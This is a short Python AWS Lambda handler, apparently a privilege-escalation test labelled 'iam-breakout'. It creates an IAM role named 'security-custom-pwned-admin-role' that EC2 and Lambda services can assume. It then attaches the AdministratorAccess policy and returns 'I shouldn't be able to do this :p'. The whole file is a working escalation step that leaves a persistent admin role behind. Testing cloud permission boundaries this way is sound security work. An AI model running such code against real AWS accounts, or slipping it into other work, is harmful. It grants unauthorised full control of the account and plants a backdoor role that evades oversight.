import boto3
import logging
import json

logger = logging.getLogger()
logger.setLevel(logging.INFO)


def handler(event, context):
    iam_client = boto3.client('iam')
    assume_role_policy_document = json.dumps({
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": [
                        "ec2.amazonaws.com",
                        "lambda.amazonaws.com"
                    ]
                },
                "Action": "sts:AssumeRole"
            }
        ]
    })
    role_name="security-custom-pwned-admin-role"

    ##########################################
    ## Create a Role w/ assumerole access.
    ##########################################

    logger.info("Attempting create a new role.")

    create_role_res = iam_client.create_role(
        RoleName=role_name,
        AssumeRolePolicyDocument=assume_role_policy_document,
        Description='(iam-breakout) Role created from Lambda.'
    )

    logger.info("create_role_res", create_role_res)

    ##########################################
    ## Attach an admin policy to the newly created role.
    ##########################################

    logger.info("Attempting create attach a admin policy.")

    attach_role_policy_res = iam_client.attach_role_policy(
        RoleName=role_name,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )

    logger.info("attach_role_policy_res", attach_role_policy_res)

    return "I shouldn't be able to do this :p"
